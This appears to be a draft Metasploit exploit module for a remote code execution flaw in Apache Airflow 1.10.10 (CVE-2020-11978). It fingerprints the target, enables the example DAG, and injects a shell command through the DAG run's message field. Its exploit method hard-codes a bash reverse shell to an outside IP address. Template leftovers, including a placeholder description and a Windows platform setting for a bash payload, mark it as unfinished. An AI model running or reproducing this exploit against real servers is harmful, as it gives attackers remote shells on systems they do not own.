##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Airflow 1.10.10 - "Example DAG" Remote Code Execution',
        'Description' => %q{
          Say something that the user might need to know
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'xuxiang',            # Original discovery and CVE submission
          'Pepe Berba',         # ExploitDB author
          'Ismail E. Dawoodjee' # Metasploit module author
        ],
        'References' => [
          [ 'EDB', '49927' ],
          [ 'CVE', '2020-11978' ],
          [ 'CVE', '2020-13927' ],
          [ 'URL', 'https://github.com/pberba/CVE-2020-11978/' ],
          [ 'URL', 'https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx' ],
          [ 'URL', 'https://lists.apache.org/thread/mq1bpqf3ztg1nhyc5qbrjobfrzttwx1d' ],
        ],
        'Platform' => 'win',
        'Targets' => [
          [
            'System or software version',
            {
              'Ret' => 0x41414141 # This will be available in `target.ret`
            }
          ]
        ],
        'Payload' => {
          'BadChars' => "\x00"
        },
        'Privileged' => false,
        'DisclosureDate' => '2020-07-14',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8080, true, 'Apache Airflow webserver default port'),
        OptString.new('TARGETURI', [ true, 'Base path', '/' ]),
        OptString.new('DAG_PATH', [ true, 'Path to vulnerable example dag', '/api/experimental/dags/example_trigger_target_dag'])
      ]
    )
  end

  def check
    uri = normalize_uri(target_uri.path, 'admin', 'airflow', 'login')
    print_status("Checking target web server for a response at: #{full_uri(uri)}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })

    unless res
      return CheckCode::Unknown('Target did not respond to check request.')
    end

    unless res.code == 200 && res.body.downcase.include?('airflow')
      return CheckCode::Unknown('Target is not running Apache Airflow.')
    end

    print_good('Target is running Apache Airflow.')

    # <a href="https://airflow.apache.org/docs/1.10.10">
    print_status('Checking Apache Airflow version...')
    version_number = res.body.to_s.scan(%r{docs/([\d.]+)}).flatten.first

    unless version_number
      return CheckCode::Detected('Apache Airflow version cannot be determined.')
    end

    print_good("Target is running Apache Airflow Version #{version_number}.")

    if Rex::Version.new(version_number) <= Rex::Version.new('1.10.10')
      return CheckCode::Appears(
        'However, extra checks are still required to make sure the example DAGs are ' \
        'loaded, running, and executable.'
      )
    end

    return CheckCode::Safe
  end

  def check_api
    uri = normalize_uri(target_uri.path, 'api', 'experimental', 'test')
    print_status("Checking if Airflow Experimental REST API is accessible at: #{full_uri(uri)}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })

    unless res && res.code == 200
      fail_with(Failure::NotFound, 'Could not access the Airflow Experimental REST API.')
    end

    print_good('Airflow Experimental REST API is accessible.')
  end

  def check_task
    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'tasks', 'bash_task')
    print_status('Checking for vulnerability of \'example_trigger_target_dag.bash_task\'...')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })

    unless res && res.code == 200
      fail_with(Failure::NotVulnerable,
                'Could not find \'example_trigger_target_dag.bash_task\'. ' \
                'Target is not vulnerable to CVE-2020-11978.')
    end

    if res.get_json_document['env'].include?('dag_run')
      fail_with(Failure::NotVulnerable,
                'The \'example_trigger_target_dag.bash_task\' is patched. ' \
                'Target is not vulnerable to CVE-2020-11978.')
    end

    print_good('The \'example_trigger_target_dag.bash_task\' is vulnerable.')
  end

  def check_unpaused
    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'paused', 'false')
    print_status('Checking if \'example_trigger_target_dag.bash_task\' is enabled...')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply,
                'Could not enable \'example_trigger_target_dag.bash_task\'. ' \
                'Example DAGs were not loaded.')
    end

    print_good('The \'example_trigger_target_dag.bash_task\' is enabled.')
  end

  def create_dag(cmd)
    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'dag_runs')
    print_status('Creating new DAG...')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'ctype' => 'application/json',
      'data' => JSON.generate({ conf: { message: "\"; #{cmd} #" } })
    })

    unless res && res.code == 200
      fail_with(Failure::PayloadFailed, 'Failed to create DAG.')
    end

    print_good("Successfully created DAG: #{res.get_json_document['message']}")
    return res.get_json_document['execution_date']
  end

  def await_execution(execution_date)
    uri = normalize_uri(target_uri.path, datastore['DAG_PATH'], 'dag_runs', execution_date, 'tasks', 'bash_task')
    print_status('Waiting for Scheduler to run the DAG. This might take a while...')
    print_warning('If the Bash task is never queued, then the Scheduler might not be running.')

    loop do
      sleep(10)
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => uri
      })

      unless res && res.code == 200
        fail_with(Failure::Unknown, 'Bash task state cannot be determined.')
      end

      state = res.get_json_document['state']
      if state == 'queued'
        print_status('Bash task is queued...')
      elsif state == 'running'
        print_good('Bash task is running...')
        break
      elsif state == 'success'
        print_good('Successfully ran Bash task.')
        break
      elsif state == 'None'
        print_warning('Bash task is not yet queued...')
      else
        print_status("Bash task state: #{state}.")
      end
    end
  end

  def exploit
    check_api
    check_task
    check_unpaused
    execution_date = create_dag('bash -i >& /dev/tcp/192.168.245.128/443 0>&1')
    await_execution(execution_date)
  end

end
